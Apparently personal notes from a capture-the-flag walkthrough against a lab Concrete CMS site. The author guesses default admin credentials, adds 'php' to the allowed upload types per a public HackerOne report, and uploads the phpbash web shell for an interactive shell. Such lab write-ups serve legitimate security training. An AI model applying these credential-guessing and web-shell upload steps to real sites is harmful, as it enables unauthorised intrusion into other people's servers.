trying 
```
admin
admin
```


```
Unable to complete action: your IP address has been banned. Please contact the administrator of this site for more information.
```

guess they were not kidding, rebooted the machine and tried more credentials

```
admin
password
```

http://10.10.210.78:85/app/castle/index.php/dashboard/welcome

![[admin dash.png]]


https://vulners.com/hackerone/H1:768322

following the vuln report, we navigate to allowed file types

```
http://10.10.210.78:85/app/castle/index.php/dashboard/system/files/filetypes
```

we add php and save, bringin the allowed files types to be 

```
flv, jpg, gif, jpeg, ico, docx, xla, png, psd, swf, doc, txt, xls, xlsx, csv, pdf, tiff, rtf, m4a, mov, wmv, mpeg, mpg, wav, 3gp, avi, m4v, mp4, mp3, qt, ppt, pptx, kml, xml, svg, webm, ogg, ogv, php
```

now we navigate to files

```
http://10.10.210.78:85/app/castle/index.php/dashboard/files/search
```

click on upload file

I am uploading phpbash

![[file upload.png]]

![[upload complete.png]]

visit the url

http://10.10.210.78:85/app/castle/application/files/6317/3227/4955/phpbash.php

we have an interactive shell

![[phpbash.png]]

